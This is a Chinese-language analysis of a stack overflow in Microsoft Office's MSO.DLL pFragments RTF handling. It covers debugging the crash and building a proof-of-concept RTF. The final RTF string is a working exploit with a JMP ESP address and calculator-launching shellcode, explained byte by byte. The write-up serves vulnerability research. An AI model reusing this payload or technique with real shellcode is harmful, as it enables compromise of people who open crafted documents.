0x01 漏洞描述

![](../Images/12294213fe58ad5c43aa3d7aced12004.png)

  

漏洞成因：栈溢出漏洞。MSO.DLL在处理pFragments数组时未校验复制长度，故可构造数据造成栈溢出，劫持执行流。  
影响版本：Microsoft Office XP SP3、Office 2003 SP3、Office 2007 SP2、Office 2010、Office 2004 and 2008 for Mac、Office for Mac 2011。

0x02 漏洞分析

![](../Images/12294213fe58ad5c43aa3d7aced12004.png)

  

分析环境：OS版本：Windows XP SP3Word版本：11.0.5604.0MSO.DLL版本：11.0.5606.0 使用msf生成POC：![](../Images/8b8a95fe8d4b216cd3040535c8c46f75.png)WinDbg附加WINWORD.exe，打开POC文档，崩溃点如下：![](../Images/e75a90ef6d249d2a634f312271181d3c.png)崩溃原因是EDI指向内存区域为只读属性：![](../Images/d4aa94347af07f9a932e76d72b8fe9c9.png)重新附加WINWORD.exe，bp 30e9eb88设置断点，载入POC，成功断下，查看调用堆栈如下： ![](../Images/bbe61515381b93eee762ed8dfc6f85e0.png)IDA载入MSO.DLL，定位到0x30F4CC93位置，查看其如何传递参数：![](../Images/04d6cdfb9e06167bdcfdd5afb6fefb38.png)EDI指向sub\_30F4CC5D中局部变量，距离函数返回地址0x14字节，而sub\_30E9EB62在执行复制操作之前并未检查长度，故可以造成栈溢出。 ESI与sub\_30D2810C返回值相关，跟进分析：![](../Images/2d9d9afb1205fbb57dd2ea9698ca9dee.png)而ECX值需回溯到sub\_30F4CD58中： ![](../Images/aae0ff48473f7c3c07ca4db79eca7f8b.png)回溯到sub\_30F4CD58： ![](../Images/f988dcf99d3db5094207c54f0dcaab45.png)回溯到此，三个参数的传递过程都已清晰，参数1： ![](../Images/70d8e6d51083c472e3551d8d389a0aee.png)参数2为ebp-10h，参数3为0。 借由WinDbg查看参数1具体值，bp 30F4CD58： ![](../Images/5b51df6512a694f268ebb8d49726d72d.png)bp 30F4CC73： ![](../Images/4c6974152c398b56d25a9f1f71eeabc6.png)bp 30F4CC7D：![](../Images/e929f612768beb5b9679955f3ebfcef5.png)最终传递给sub\_30E9EB62三个参数如下： ![](../Images/dd6c5164e271b7faaa25922726167013.png)计算复制长度及源位置：![](../Images/3bdfab4d461c562d69124fbacfad857d.png)WinHex查看POC：![](../Images/e3913ebaf741968ea8a0756000c8350d.png)整体思路：由崩溃点确定漏洞触发位置——>回溯调用栈——>分析参数如何计算及传递。

0x03 构造POC

![](../Images/12294213fe58ad5c43aa3d7aced12004.png)

  

查阅Microsoft Office Word 2003 RTF Specification可知：![](../Images/c1022dfe960d009f673dc1e77f47fe3e.png)定义数组规范如下： ![](../Images/9c87677029a9b1b7dafa1777b3e90f15.png)定义Drawing Object(绘图对象)属性规范如下：  
![](../Images/b497cd690778384e15aca1bbb2aa5018.png)  
首先我们构造一RTF文档如下：

*   

```
`{\rtf1{\shp{\*\shpinst{\sp{\sn pFragments}{\sv 1;1;12345678}}}}}`
```

执行到0x3122FFE8处：   
![](../Images/8228ab1c06c93fd6483a465acb7f2169.png)此时其返回值为0，不会执行到调用Ordinal501处： ![](../Images/68050588319f59e81a8f0e454ac40dbe.png)而Ordinal501过程会修改内存0x014d1592处内容，进而影响到sub\_30E9EB62中复制长度：![](../Images/ba011393782982bc6761396567a723e2.png)接着构造RTF文档如下：

*   

```
`{\rtf1{\shp{\*\shpinst{\sp{\sn pFragments}{\sv 1;1;123456780800616162636465666768}}}}}`
```

执行完0x3122FFE8后返回值为1：  
![](../Images/fbad6e95b6e6fe553d12f1546040f223.png)跟进Ordinal501：![](../Images/6019ebfeb2db3c4a4f119a9fadf64d96.png)继续执行到0x30E9EB88处： ![](../Images/8ed6e69d1460a4c1a962202462fc3eb0.png)最终构造POC内容如下：

*   

```
`{\rtf1{\shp{\*\shpinst{\sp{\sn pfragments}{\sv 1;1;1234567801016161616162626262636363636464646465656565904dc57dAABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD33c050b82e646c6c50b8656c333250b86b65726e508bc450b87b1d807cffd033c050b82e65786550b863616c63508bc46a0550b8ad23867cffd033c050b8faca817cffd0}}}}}`
```

{\\rtf1{\\shp{\\\*\\shpinst{\\sp{\\sn pfragments}{\\sv 1;1;无需多言，12345678是填充数据，0101是复制长度(笔者并未精确计算)，6161616162626262636363636464646465656565用以填充栈，904dc57d是JMP ESP指令地址，AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD会被处理为全零(详见下文)，33c050b82e646c6c50b8656c333250b86b65726e508bc450b87b1d807cffd033c050b82e65786550b863616c63508bc46a0550b8ad23867cffd033c050b8faca817cffd0是一段弹计算器Shellcode(一定要以小写字母形式写入)。  
  
注：1\. AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD会被处理为全零据笔者调试，复制字符中的大写字母会以0进行替换：![](../Images/f963b13142eec213c521bf6c1df4d7ce.png)而30F4CB29处指令会将\[ebp+10h\]与0进行比较——若不相等，会调用sub\_30F4CE43，如此一来，会出现如下提示：![](../Images/45fb276d2b65c896801d4f0121a1af2b.png)而不会跳转到Shellcode执行。\[ebp+10h\]指向数据正好位于此块中，故我们借其处理机制将之全部替换为0，以完成跳转：![](../Images/9fbc4d786f6e1ae48ddb6fd17f975ac0.png)![](../Images/180655fae1843deec68e483bfa93643f.png)最终成功弹出计算器：![](../Images/4da073192a32524b3837f4ccdf188580.png)2\. 上述内容笔者采用"正序"阐述，但实际调试过程却是"倒序"。最初切入点是0x30E9EB6F，确定长度字节位置：![](../Images/b0a87c4e80be97025cf9be8fc7e62034.png)而此处内存由VirtualAlloc分配，故附加WINWORD.EXE后于该API处设断，F9运行起来，打开RTF文档，第三次断下时：![](../Images/0e10c5b289b5a542a3da4b4ddf3f9d6f.png)此时便可于0x14D158C处设置内存访问断点。
